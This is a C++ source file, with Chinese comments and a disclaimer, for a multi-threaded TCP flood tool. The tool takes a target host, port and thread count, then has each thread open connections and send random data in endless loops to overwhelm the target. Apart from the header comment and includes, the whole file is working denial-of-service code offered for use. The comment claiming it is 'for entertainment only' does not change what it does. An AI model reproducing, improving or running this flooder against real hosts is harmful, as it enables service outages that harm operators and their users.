/*
 * 由devK7制作，版权由K7保留所有
 * 本工具仅供娱乐，请勿用于非法用途
 * 若出现意外，与开发者无关
 * 反馈问题以及提出意见加QQ群869801002
 */
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <netinet/in.h>
#include <string>
#include <cstring>
#include <ctime>
#include <vector>
#include <thread>
#include <future>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

using namespace std;

string host;
int port;
int total(0);
const char* rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>/?`~");
short send_data_len(1024);
struct sockaddr_in servaddr;

void d() {
    while(true) {
        auto _ = async(launch::async, [&]{
            while(true) {
                int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if(sockfd < 0) {
                    fprintf(stderr, "\033[41;37mERROR\033[0m\n  次数%dSocket初始化失败", ++total);
                    perror("原因");
                    close(sockfd);
                    continue;
                }
                if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
                    fprintf(stderr, "\033[41;37mERROR\033[0m 次数%d时连接失败\n", ++total);
                    perror("原因");
                    close(sockfd);
                    continue;
                }
                srand(time(0));
                string srs;
                for (size_t i = 0; i < send_data_len; ++i) srs += rc[rand() % strlen(rc) + 1];
                send(sockfd, srs.c_str(), srs.size(), MSG_NOSIGNAL);
                close(sockfd);
                printf("\033[42;37mOK\033[0m 成功%d次\n", ++total);
            }
        });
    }
}

int main(int argc, char** argv) {
    int tn;//线程数量
    if(argc >= 4) {
        host = argv[1];
        port = atoi(argv[2]);
        tn = atoi(argv[3]);
    } else {
        printf("\033[43;37;1mWARNING\033[0m\033[1m 用'%s {string host} {int port} {int thread_count}' 会更方便\033[0m\n", argv[0]);
        printf("\033[38;5;153m输入目标地址: \033[0m");
        getline(cin, host);
        printf("\033[38;5;153m请输入端口(0-65535): \033[0m");
        while(scanf("%d", &port) != 1 || port < 0 || port > 65535) {
            while(getchar() != '\n');//清除错误输入
            printf("\033[41;37m输入的端口应介于0和65535之间\033[0m\n\033[38;5;153m请重新输入: \033[0m");
        }
        printf("\033[38;5;153m线程数: \033[0m");
        cin >> tn;
    }
    hostent* h = gethostbyname(host.c_str());
    if(h == NULL) {
        fprintf(stderr, "%s\n",hstrerror(h_errno));
        return -1;
    }
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    memcpy((void*)&servaddr.sin_addr.s_addr, (void*)h->h_addr_list[0], h->h_length);
    vector<thread> ths;//多线程围攻
    for(int i = 0; i < tn; ++i) ths.emplace_back(thread(d));
    for(auto& t:ths) t.join();//等待所有线程完毕
    return 0;
}
